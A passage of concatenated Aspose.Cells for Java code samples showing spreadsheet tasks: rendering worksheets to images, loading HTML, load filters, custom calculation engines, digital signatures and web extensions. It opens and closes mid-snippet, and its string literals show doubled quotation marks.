 else if (worksheet.getShapes().getCount() > 0) {
 System.out.println(worksheet.getName() + "" is not empty because there are one or more shapes"");
	}
 // Check if worksheet has empty initialized cells
 else {
 Range range = worksheet.getCells().getMaxDisplayRange();
 Iterator rangeIterator = range.iterator();
 if (rangeIterator.hasNext()) {
 System.out.println(worksheet.getName() + "" is not empty because one or more cells are initialized"");
		} else {
 System.out.println(worksheet.getName() + "" is empty"");
		}
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ConversionOptions.class) + ""TechnicalArticles/"";
// Instantiate a new Workbook object
// Open template
Workbook book = new Workbook(dataDir + ""book1.xlsx"");


// Get the first worksheet
Worksheet sheet = book.getWorksheets().get(0);


// Apply different Image and Print options
ImageOrPrintOptions options = new ImageOrPrintOptions();


// Set Horizontal Resolution
options.setHorizontalResolution(300);


// Set Vertical Resolution
options.setVerticalResolution(300);


// Set Image Format
options.setImageType(ImageType.JPEG);


// If you want entire sheet as a single image
options.setOnePagePerSheet(true);


// Render the sheet with respect to specified image/print options
SheetRender sr = new SheetRender(sheet, options);


// Render/save the image for the sheet
sr.toImage(0, dataDir + ""ConversionOptions_out.jpg"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ConvertWorkbooktoImage.class) + ""TechnicalArticles/"";
// Instantiate a new Workbook object
Workbook book = new Workbook(dataDir + ""book1.xlsx"");


// Apply different Image and Print options
ImageOrPrintOptions options = new ImageOrPrintOptions();


// Set Image Format
options.setImageType(ImageType.TIFF);


// If you want entire sheet as a single image
options.setOnePagePerSheet(true);


// Render to image
WorkbookRender render = new WorkbookRender(book, options);
render.toImage(dataDir + ""CWorkbooktoImage_out.tiff"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ConvertWorksheettoImage.class) + ""TechnicalArticles/"";
//Instantiate a new Workbook object
//Open template
Workbook book = new Workbook(dataDir + ""book1.xlsx"");


//Get the first worksheet
Worksheet sheet = book.getWorksheets().get(0);


//Apply different Image and Print options
ImageOrPrintOptions options = new ImageOrPrintOptions();


//Set Horizontal Resolution
options.setHorizontalResolution(300);


//Set Vertical Resolution
options.setVerticalResolution(300);


//Set TiffCompression
options.setTiffCompression(TiffCompression.COMPRESSION_LZW);


//Set Image Format
options.setImageType(ImageType.TIFF);


//Set printing page type
options.setPrintingPage(PrintingPageType.DEFAULT);


//Render the sheet with respect to specified image/print options
SheetRender sr = new SheetRender(sheet, options);


//Render/save the image for the sheet
sr.toImage(0, dataDir + ""CWorksheettoImage_out.tiff"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ConvertWorksheetToImageByPage.class) + ""TechnicalArticles/"";
// Create a new Workbook object
// Open a template excel file
Workbook book = new Workbook(dataDir + ""ConvertWorksheetToImageByPage.xlsx"");
// Get the first worksheet
Worksheet sheet = book.getWorksheets().get(0);
// Define ImageOrPrintOptions
ImageOrPrintOptions options = new ImageOrPrintOptions();
// Set Resolution
options.setHorizontalResolution(200);
options.setVerticalResolution(200);
options.setImageType(ImageType.TIFF);


// Sheet2Image by page conversion
SheetRender render = new SheetRender(sheet, options);
for (int j = 0; j < render.getPageCount(); j++) {
 render.toImage(j, dataDir + sheet.getName() + "" Page"" + (j + 1) + "".tif"");
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ConvertWorksheettoImageFile.class) + ""TechnicalArticles/"";
// Create a new Workbook object
// Open a template excel file
Workbook book = new Workbook(dataDir + ""book1.xlsx"");
// Get the first worksheet
Worksheet sheet = book.getWorksheets().get(0);


// Define ImageOrPrintOptions
ImageOrPrintOptions imgOptions = new ImageOrPrintOptions();
// Specify the image format
imgOptions.setImageType(ImageType.JPEG);


// Render the sheet with respect to specified image/print options
SheetRender render = new SheetRender(sheet, imgOptions);
// Render the image for the sheet
render.toImage(0, dataDir + ""CWToImageFile.jpg"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CreateTransparentImage.class) + ""TechnicalArticles/"";
// Create workbook object from source file
Workbook wb = new Workbook(dataDir + ""aspose-sample.xlsx"");


// Apply different image or print options
ImageOrPrintOptions imgOption = new ImageOrPrintOptions();
imgOption.setImageType(ImageType.PNG);
imgOption.setHorizontalResolution(200);
imgOption.setVerticalResolution(200);
imgOption.setOnePagePerSheet(true);


// Apply transparency to the output image
imgOption.setTransparent(true);


// Create image after apply image or print options
SheetRender sr = new SheetRender(wb.getWorksheets().get(0), imgOption);
sr.toImage(0, dataDir + ""CTransparentImage_out.png"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
import java.util.ArrayList;


import com.aspose.cells.AbstractCalculationEngine;
import com.aspose.cells.CalculationData;
import com.aspose.cells.DateTime;


public class CustomFunctionStaticValue extends AbstractCalculationEngine {
 @Override
 public void calculate(CalculationData calculationData) {
 calculationData.setCalculatedValue(new Object[][] { new Object[] { new DateTime(2015, 6, 12, 10, 6, 30), 2 },
 new Object[] { 3.0, ""Test"" } });
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory
String dataDir = Utils.getSharedDataDir(DeleteRedundantSpacesFromHtml.class) + ""TechnicalArticles/"";


// Sample Html containing redundant spaces after <br> tag
String html = ""<html>"" + ""<body>"" + ""<table>"" + ""<tr>"" + ""<td>"" + ""<br>    This is sample data""
		+ ""<br>    This is sample data"" + ""<br>    This is sample data"" + ""</td>"" + ""</tr>"" + ""</table>""
		+ ""</body>"" + ""</html>"";


// Convert Html to byte array
byte[] byteArray = html.getBytes();


// Set Html load options and keep precision true
HtmlLoadOptions loadOptions = new HtmlLoadOptions(LoadFormat.HTML);
loadOptions.setDeleteRedundantSpaces(true);


// Convert byte array into stream
java.io.ByteArrayInputStream stream = new java.io.ByteArrayInputStream(byteArray);


// Create workbook from stream with Html load options
Workbook workbook = new Workbook(stream, loadOptions);


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Auto fit the sheet columns
worksheet.autoFitColumns();


// Save the workbook
workbook.save(dataDir + ""DRSFromHtml_out-"" + loadOptions.getDeleteRedundantSpaces() + "".xlsx"", SaveFormat.XLSX);


System.out.println(""File saved"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Source directory
String dataDir = AsposeCellsExamples.Utils.getSharedDataDir(DetectFileFormatOfEncryptedFiles.class) + ""TechnicalArticles/"";


String filename = dataDir + ""encryptedBook1.out.tmp"";


FileFormatInfo fileFormatInfo = FileFormatUtil.detectFileFormat(filename,""1234""); // The password is 1234


if(fileFormatInfo.getFileFormatType() == FileFormatType.EXCEL_97_TO_2003) {
 System.out.println(""File Format: EXCEL_97_TO_2003"");
} else if(fileFormatInfo.getFileFormatType() == FileFormatType.PPTX) {
 System.out.println(""File Format: PPTX"");
} else if(fileFormatInfo.getFileFormatType() == FileFormatType.DOCX) {
 System.out.println(""File Format: DOCX"");
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ExportRangeofCells.class) + ""TechnicalArticles/"";
// Create workbook from source file.
Workbook workbook = new Workbook(dataDir + ""book1.xlsx"");


// Access the first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Set the print area with your desired range
worksheet.getPageSetup().setPrintArea(""E8:H10"");


// Set all margins as 0
worksheet.getPageSetup().setLeftMargin(0);
worksheet.getPageSetup().setRightMargin(0);
worksheet.getPageSetup().setTopMargin(0);
worksheet.getPageSetup().setBottomMargin(0);


// Set OnePagePerSheet option as true
ImageOrPrintOptions options = new ImageOrPrintOptions();
options.setOnePagePerSheet(true);
options.setImageType(ImageType.JPEG);


// Take the image of your worksheet
SheetRender sr = new SheetRender(worksheet, options);
sr.toImage(0, dataDir + ""ERangeofCells_out.jpg"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ExportWorksheettoImage.class) + ""TechnicalArticles/"";
// Create workbook object from source file
Workbook workbook = new Workbook(dataDir + ""source.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


/*
 * Set image or print options, We want one page per sheet, The image format is in png And desired dimensions are
 * 400x400
 */
ImageOrPrintOptions opts = new ImageOrPrintOptions();
opts.setOnePagePerSheet(true);
opts.setImageType(ImageType.PNG);
opts.setDesiredSize(400, 400);


// Render sheet into image
SheetRender sr = new SheetRender(worksheet, opts);
sr.toImage(0, dataDir + ""EWSheetToImage_out.png"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ExtractImagesfromWorksheets.class) + ""TechnicalArticles/"";
// Open a template Excel file
Workbook workbook = new Workbook(dataDir + ""book3.xlsx"");


// Get the first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Get the first Picture in the first worksheet
Picture pic = worksheet.getPictures().get(0);


// Set the output image file path
String fileName = ""aspose-logo.jpg"";


// Note: you may evaluate the image format before specifying the image path


// Define ImageOrPrintOptions
ImageOrPrintOptions printoption = new ImageOrPrintOptions();


// Specify the image format
printoption.setImageType(ImageType.JPEG);


// Save the image
pic.toImage(dataDir + fileName, printoption);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(FilterDataWhileLoadingWorkbook.class) + ""TechnicalArticles/"";
// Set the load options, we only want to load shapes and do not want to load data
LoadOptions opts = new LoadOptions(LoadFormat.XLSX);
opts.getLoadFilter().setLoadDataFilterOptions(LoadDataFilterOptions.SHAPE);


// Create workbook object from sample excel file using load options
Workbook wb = new Workbook(dataDir + ""sampleFilterDataWhileLoadingWorkbook.xlsx"", opts);


// Save the output in PDF format
wb.save(dataDir + ""sampleFilterDataWhileLoadingWorkbook_out.pdf"", SaveFormat.PDF);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
public class FilterObjectsLoadingWorksheets {


 // Implement your own custom load filter, it will enable you to filter your
 // individual worksheet
 class CustomLoadFilter extends LoadFilter {
 public void startSheet(Worksheet sheet) {


 if (sheet.getName().equals(""NoCharts"")) {
 // Load everything and filter charts
 this.setLoadDataFilterOptions(LoadDataFilterOptions.ALL& ~LoadDataFilterOptions.CHART);
			}


 if (sheet.getName().equals(""NoShapes"")) {
 // Load everything and filter shapes
 this.setLoadDataFilterOptions(LoadDataFilterOptions.ALL& ~LoadDataFilterOptions.DRAWING);
			}


 if (sheet.getName().equals(""NoConditionalFormatting"")) {
 // Load everything and filter conditional formatting
 this.setLoadDataFilterOptions(LoadDataFilterOptions.ALL& ~LoadDataFilterOptions.CONDITIONAL_FORMATTING);
			}
		}// End StartSheet method.
	}// End CustomLoadFilter class.


 public static void main(String[] args) throws Exception {


 FilterObjectsLoadingWorksheets pg = new FilterObjectsLoadingWorksheets();
 pg.Run();
	}


 public void Run() throws Exception {


 // The path to the documents directory.
 String dataDir = Utils.getSharedDataDir(FilterObjectsLoadingWorksheets.class) + ""TechnicalArticles/"";


 // Filter worksheets using custom load filter
 LoadOptions ldOpts = new LoadOptions();
 ldOpts.setLoadFilter(new CustomLoadFilter());


 // Load the workbook with above filter
 Workbook wb = new Workbook(dataDir + ""sampleFilterDifferentObjects.xlsx"", ldOpts);


 // Take the image of all worksheets one by one
 for (int i = 0; i < wb.getWorksheets().getCount(); i++) {
 // Access worksheet at index i
 Worksheet ws = wb.getWorksheets().get(i);


 // Create image or print options, we want the image of entire
 // worksheet
 ImageOrPrintOptions opts = new ImageOrPrintOptions();
 opts.setOnePagePerSheet(true);
 opts.setImageType(ImageType.PNG);


 // Convert worksheet into image
 SheetRender sr = new SheetRender(ws, opts);
 sr.toImage(0, dataDir + ws.getName() + "".png"");
		}
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(sourceDir + ""sampleGenerateDatabarImage.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access the cell which contains conditional formatting databar
Cell cell = worksheet.getCells().get(""C1"");


// Create and get the conditional formatting of the worksheet
int idx = worksheet.getConditionalFormattings().add();
FormatConditionCollection fcc = worksheet.getConditionalFormattings().get(idx);
fcc.addCondition(FormatConditionType.DATA_BAR);
fcc.addArea(CellArea.createCellArea(""C1"", ""C4""));


// Access the conditional formatting databar
DataBar dbar = fcc.get(0).getDataBar();


// Create image or print options
ImageOrPrintOptions opts = new ImageOrPrintOptions();
opts.setImageType(ImageType.PNG);


// Get the image bytes of the databar
byte[] imgBytes = dbar.toImage(cell, opts);


// Write image bytes on the disk
FileOutputStream out = new FileOutputStream(outputDir + ""databar.png"");
out.write(imgBytes);
out.close();


// save workbook with databars
workbook.save(outputDir + ""databar.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(GenerateThumbnailofWorksheet.class) + ""TechnicalArticles/"";
// Instantiate and open an Excel file
Workbook book = new Workbook(dataDir + ""book1.xlsx"");


// Define ImageOrPrintOptions
ImageOrPrintOptions imgOptions = new ImageOrPrintOptions();
// Set the vertical and horizontal resolution
imgOptions.setVerticalResolution(200);
imgOptions.setHorizontalResolution(200);
// Set the image's format
imgOptions.setImageType(ImageType.JPEG);
// One page per sheet is enabled
imgOptions.setOnePagePerSheet(true);


// Get the first worksheet
Worksheet sheet = book.getWorksheets().get(0);
// Render the sheet with respect to specified image/print options
SheetRender sr = new SheetRender(sheet, imgOptions);
// Render the image for the sheet
sr.toImage(0, dataDir + ""mythumb.jpg"");


// Creating Thumbnail
java.awt.Image img = ImageIO.read(new File(dataDir + ""mythumb.jpg"")).getScaledInstance(100, 100, BufferedImage.SCALE_SMOOTH);
BufferedImage img1 = new BufferedImage(100, 100, BufferedImage.TYPE_INT_RGB);
img1.createGraphics().drawImage(
 ImageIO.read(new File(dataDir + ""mythumb.jpg"")).getScaledInstance(100, 100, img.SCALE_SMOOTH), 0, 0, null);
ImageIO.write(img1, ""jpg"", new File(dataDir + ""GTOfWorksheet_out.jpg""));
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(KeepPrecisionOfLargeNumbers.class) + ""TechnicalArticles/"";


// Sample Html containing large number with digits greater than 15
String html = ""<html>"" + ""<body>"" + ""<p>1234567890123456</p>"" + ""</body>"" + ""</html>"";


// Convert Html to byte array
byte[] byteArray = html.getBytes();


// Set Html load options and keep precision true
HtmlLoadOptions loadOptions = new HtmlLoadOptions(LoadFormat.HTML);
loadOptions.setKeepPrecision(true);


// Convert byte array into stream
java.io.ByteArrayInputStream stream = new java.io.ByteArrayInputStream(byteArray);


// Create workbook from stream with Html load options
Workbook workbook = new Workbook(stream, loadOptions);


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Auto fit the sheet columns
worksheet.autoFitColumns();


// Save the workbook
workbook.save(dataDir + ""KPOfLargeNumbers_out.xlsx"", SaveFormat.XLSX);


System.out.println(""File saved"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(RemoveWhitespaceAroundData.class) + ""TechnicalArticles/"";


// Instantiate a workbook
// Open the template file
Workbook book = new Workbook(dataDir + ""book1.xlsx"");


// Get the first worksheet
Worksheet sheet = book.getWorksheets().get(0);


// Specify your print area if you want
// sheet.PageSetup.PrintArea = ""A1:H8"";


// To remove the white border around the image.
sheet.getPageSetup().setLeftMargin(0);
sheet.getPageSetup().setRightMargin(0);
sheet.getPageSetup().setTopMargin(0);
sheet.getPageSetup().setBottomMargin(0);


// Define ImageOrPrintOptions
ImageOrPrintOptions imgOptions = new ImageOrPrintOptions();
imgOptions.setImageType(ImageType.EMF);
// Set only one page would be rendered for the image
imgOptions.setOnePagePerSheet(true);
imgOptions.setPrintingPage(PrintingPageType.IGNORE_BLANK);


// Create the SheetRender object based on the sheet with its
// ImageOrPrintOptions attributes
SheetRender render = new SheetRender(sheet, imgOptions);
// Convert the image
render.toImage(0, dataDir + ""RWhitespaceAroundData_out.emf"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the directories.
String sourceDir = Utils.Get_SourceDirectory();
String outDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(sourceDir + ""sampleRenderCustomDateFormat.xlsx"");
workbook.save(outDir + ""sampleRenderCustomDateFormat_out.pdf"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String outputDir = Utils.Get_OutputDirectory();
Workbook workbook = new Workbook();
Cells cells = workbook.getWorksheets().get(0).getCells();


Cell cell = cells.get(0, 0);
cell.setArrayFormula(""=MYFUNC()"", 2, 2);


Style style = cell.getStyle();
style.setNumber(14);
cell.setStyle(style);


CalculationOptions copt = new CalculationOptions();
copt.setCustomEngine(new CustomFunctionStaticValue());
workbook.calculateFormula(copt);


// Save to XLSX by setting the calc mode to manual
workbook.getSettings().getFormulaSettings().setCalculationMode(CalcModeType.MANUAL);
workbook.save(outputDir + ""output.xlsx"");


// Save to PDF
workbook.save(outputDir + ""output.pdf"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Create a new Workbook.
Workbook workbook = new Workbook();


// Get the first worksheet.
Worksheet sheet = workbook.getWorksheets().get(0);


// Get the image file.
File file = new File(""background.jpg"");


// Get the picture into the streams.
byte[] imageData = new byte[(int) file.length()];
FileInputStream fis = new FileInputStream(file);
fis.read(imageData);


// Set the background image for the sheet.
sheet.setBackgroundImage(imageData);
fis.close();


// Save the excel file
workbook.save(""SBPforWorksheet.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(SupportthelayoutofDIVtags.class) + ""TechnicalArticles/"";


// Html string
String export_html = "" <html> <body>     <table>         <tr>             <td>                 <div>This is some Text.</div>                 <div>                     <div>                         <span>This is some more Text</span>                     </div>                     <div>                         <span>abc@abc.com</span>                     </div>                     <div>                         <span>1234567890</span>                     </div>                     <div>                         <span>ABC DEF</span>                     </div>                 </div>                 <div>Generated On May 30, 2016 02:33 PM <br />Time Call Received from Jan 01, 2016 to May 30, 2016</div>             </td>             <td>                 <img src='ASpose_logo_100x100.png' />             </td>         </tr>     </table> </body> </html>"";


// Convert html string to byte array input stream
byte[] bts = export_html.getBytes();
ByteArrayInputStream bis = new ByteArrayInputStream(bts);


// Specify HTML load options, support div tag layouts
HtmlLoadOptions loadOptions = new HtmlLoadOptions(LoadFormat.HTML);
loadOptions.setSupportDivTag(true);


// Create workbook object from the html using load options
Workbook wb = new Workbook(bis, loadOptions);


// Auto fit rows and columns of first worksheet
Worksheet ws = wb.getWorksheets().get(0);
ws.autoFitRows();
ws.autoFitColumns();


// Save the workbook in xlsx format
wb.save(dataDir + ""SThelayoutofDIVtags_out.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Instantiate the workbook from sample Excel file
Workbook workbook = new Workbook(srcDir + ""sampleDataValidationRules.xlsx"");


// Access the first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


/*
 * Access Cell C1. Cell C1 has the Decimal Validation applied on it.It can take only the values Between 10 and 20
 */
Cell cell = worksheet.getCells().get(""C1"");


// Enter 3 inside this cell. Since it is not between 10 and 20, it should fail the validation
cell.putValue(3);


// Check if number 3 satisfies the Data Validation rule applied on this cell
System.out.println(""Is 3 a Valid Value for this Cell: "" + cell.getValidationValue());


// Enter 15 inside this cell. Since it is between 10 and 20, it should succeed the validation
cell.putValue(15);


// Check if number 15 satisfies the Data Validation rule applied on this cell
System.out.println(""Is 15 a Valid Value for this Cell: "" + cell.getValidationValue());


// Enter 30 inside this cell. Since it is not between 10 and 20, it should fail the validation again
cell.putValue(30);


// Check if number 30 satisfies the Data Validation rule applied on this cell
System.out.println(""Is 30 a Valid Value for this Cell: "" + cell.getValidationValue());


// Enter large number 12345678901 inside this cell
// Since it is not between 1 and 999999999999, it should pass the validation again
Cell cell2 = worksheet.getCells().get(""D1"");
cell2.putValue(12345678901l);


// Check if number 12345678901 satisfies the Data Validation rule applied on this cell
System.out.println(""Is 12345678901 a Valid Value for this Cell: "" + cell2.getValidationValue());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(WorksheetToSeparateImage.class) + ""TechnicalArticles/"";
// Instantiate a new Workbook object
// Open template
Workbook book = new Workbook(dataDir + ""book1.xlsx"");


// Iterate over all worksheets in the workbook
for (int i = 0; i < book.getWorksheets().getCount(); i++) {
 Worksheet sheet = book.getWorksheets().get(i);


 // Apply different Image and Print options
 ImageOrPrintOptions options = new ImageOrPrintOptions();


 // Set Horizontal Resolution
 options.setHorizontalResolution(300);


 // Set Vertical Resolution
 options.setVerticalResolution(300);


 // Set Image Format
 options.setImageType(ImageType.JPEG);


 // If you want entire sheet as a single image
 options.setOnePagePerSheet(true);


 // Render to image
 SheetRender sr = new SheetRender(sheet, options);
 sr.toImage(0, dataDir + ""WSheetToSImage_out-"" + sheet.getName() + "".jpg"");
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(WrapTextinCell.class) + ""TechnicalArticles/"";


// Create Workbook Object
Workbook wb = new Workbook();


// Open first Worksheet in the workbook
Worksheet ws = wb.getWorksheets().get(0);


// Get Worksheet Cells Collection
Cells cell = ws.getCells();


// Increase the width of First Column Width
cell.setColumnWidth(0, 35);


// Increase the height of first row
cell.setRowHeight(0, 65);


// Add Text to the First Cell
cell.get(0, 0).setValue(""I am using the latest version of Aspose.Cells to test this functionality"");


// Get Cell's Style
Style style = cell.get(0, 0).getStyle();


// Set Text Wrap property to true
style.setTextWrapped(true);


// Set Cell's Style
cell.get(0, 0).setStyle(style);


// Save Excel File
wb.save(dataDir + ""WrapTextinCell_out.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the source directory.
String sourceDir = Utils.Get_SourceDirectory();


Workbook workbook = new Workbook(sourceDir + ""WebExtensionsSample.xlsx"");


WebExtensionTaskPaneCollection taskPanes = workbook.getWorksheets().getWebExtensionTaskPanes();
 
for (Object obj : taskPanes)
{
 WebExtensionTaskPane taskPane = (WebExtensionTaskPane) obj;
 
 System.out.println(""Width: "" + taskPane.getWidth());
 System.out.println(""IsVisible: "" + taskPane.isVisible());
 System.out.println(""IsLocked: "" + taskPane.isLocked());
 System.out.println(""DockState: "" + taskPane.getDockState());
 System.out.println(""StoreName: "" + taskPane.getWebExtension().getReference().getStoreName());
 System.out.println(""StoreType: "" + taskPane.getWebExtension().getReference().getStoreType());
 System.out.println(""WebExtension.Id: "" + taskPane.getWebExtension().getId());
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Certificate file and its password
String certFileName = ""AsposeTest.pfx"";
String password = ""aspose"";
 
// Load the workbook which is already digitally signed to add new digital signature
Workbook workbook = new Workbook(srcDir + ""sampleDigitallySignedByCells.xlsx"");
 
// Create the digital signature collection
DigitalSignatureCollection dsCollection = new DigitalSignatureCollection();
 
// Create new digital signature and add it in digital signature collection
// ------------------------------------------------------------
// --------------Begin::creating signature---------------------
 
// Load the certificate into an instance of InputStream
InputStream inStream = new FileInputStream(srcDir + certFileName);
 
// Create an instance of KeyStore with PKCS12 cryptography
java.security.KeyStore inputKeyStore = java.security.KeyStore.getInstance(""PKCS12"");
 
// Use the KeyStore.load method to load the certificate stream and its password
inputKeyStore.load(inStream, password.toCharArray());
 
// Create an instance of DigitalSignature and pass the instance of KeyStore, password, comments and time
DigitalSignature signature = new DigitalSignature(inputKeyStore, password,
 ""Aspose.Cells added new digital signature in existing digitally signed workbook."",
 com.aspose.cells.DateTime.getNow());
 
dsCollection.add(signature);
// ------------------------------------------------------------
// --------------End::creating signature-----------------------
 
// Add digital signature collection inside the workbook
workbook.addDigitalSignature(dsCollection);
 
// Save the workbook and dispose it.
workbook.save(outDir + ""outputDigitallySignedByCells.xlsx"");
workbook.dispose();
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
String outDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook();


WebExtensionCollection extensions = workbook.getWorksheets().getWebExtensions();
WebExtensionTaskPaneCollection taskPanes = workbook.getWorksheets().getWebExtensionTaskPanes();
 
int extensionIndex = extensions.add();
int taskPaneIndex = taskPanes.add();
 
WebExtension extension = extensions.get(extensionIndex);
extension.getReference().setId(""wa104379955"");
extension.getReference().setStoreName(""en-US"");
extension.getReference().setStoreType(WebExtensionStoreType.OMEX);
 
WebExtensionTaskPane taskPane = taskPanes.get(taskPaneIndex);
taskPane.setVisible(true);
taskPane.setDockState(""right"");
taskPane.setWebExtension(extension);
 
workbook.save(outDir + ""AddWebExtension_Out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the directories.
String sourceDir = Utils.Get_SourceDirectory();
String outDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(sourceDir + ""LargeSampleFile.xlsx"");
XlsbSaveOptions options = new XlsbSaveOptions();
options.setCompressionType(OoxmlCompressionType.LEVEL_1);
long startTime = System.nanoTime();
workbook.save(outDir + ""LargeSampleFile_level_1_out.xlsb"", options);
long endTime = System.nanoTime();
long timeElapsed = endTime - startTime;
System.out.println(""Level 1 Elapsed Time: "" + timeElapsed / 1000000);


startTime = System.nanoTime();
options.setCompressionType(OoxmlCompressionType.LEVEL_6);
workbook.save(outDir + ""LargeSampleFile_level_6_out.xlsb"", options);
endTime = System.nanoTime();
timeElapsed = endTime - startTime;
System.out.println(""Level 6 Elapsed Time: "" + timeElapsed / 1000000);


startTime = System.nanoTime();
options.setCompressionType(OoxmlCompressionType.LEVEL_9);
workbook.save(outDir + ""LargeSampleFile_level_9_out.xlsb"", options);
endTime = System.nanoTime();
timeElapsed = endTime - startTime;
System.out.println(""Level 9 Elapsed Time: "" + timeElapsed / 1000000);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//directories
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


// Instantiating a WorkbookDesigner object
WorkbookDesigner designer = new WorkbookDesigner();


Workbook workbook = new Workbook(sourceDir + ""AllowLeadingApostropheSample.xlsx"");
workbook.getSettings().setQuotePrefixToStyle(false);


// Open a designer spreadsheet containing smart markers
designer.setWorkbook(workbook);


ArrayList<DataObject> list = new ArrayList<>();
list.add(new DataObject(1, ""demo""));
list.add(new DataObject(2, ""'demo""));


// Set the data source for the designer spreadsheet
designer.setDataSource(""sampleData"", list);


// Process the smart markers
designer.process();


designer.getWorkbook().save(outputDir + ""AllowLeadingApostropheSample_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create Workbook object
Workbook wb = new Workbook();


//Share the Workbook
wb.getSettings().setShared(true);


//Save the Shared Workbook
wb.save(""outputSharedWorkbook.xlsx"");
 
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
public static void main(String[] args) throws Exception {
 // The path to the directories.
 String sourceDir = Utils.Get_SourceDirectory();
 
 Workbook workbook = new Workbook(sourceDir + ""LinkTypes.xlsx"");
 
 // Get the first (default) worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);
 
 // Create a range A2:B3
 Range range = worksheet.getCells().createRange(""A1"", ""A7"");
 
 // Get Hyperlinks in range
 Hyperlink[] hyperlinks = range.getHyperlinks();
 
 for (Hyperlink link : hyperlinks)
	{
 System.out.println(link.getTextToDisplay() + "": "" + getLinkTypeName(link.getLinkType()));
	}
 
 System.out.println(""DetectLinkTypes executed successfully."");
}


private static String getLinkTypeName(int linkType){
 if(linkType == TargetModeType.EXTERNAL){
 return ""EXTERNAL"";
	} else if(linkType == TargetModeType.FILE_PATH){
 return ""FILE_PATH"";
	} else if(linkType == TargetModeType.EMAIL){
 return ""EMAIL"";
	} else {
 return ""CELL_REFERENCE"";
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the directories.
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(sourceDir + ""EmbeddedMolSample.xlsx"");
int index = 1;
for (Object obj : workbook.getWorksheets())
{
 Worksheet sheet = (Worksheet)obj;
 OleObjectCollection oles = sheet.getOleObjects();
 for (Object obj2 : oles)
	{
 OleObject ole = (OleObject)obj2;
 String fileName = outputDir + ""OleObject"" + index + "".mol "";
 FileOutputStream fos = new FileOutputStream(fileName);
 fos.write(ole.getObjectData());
 fos.flush();
 fos.close();
 index++;
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Instantiate a Workbook object
// Open an Excel file
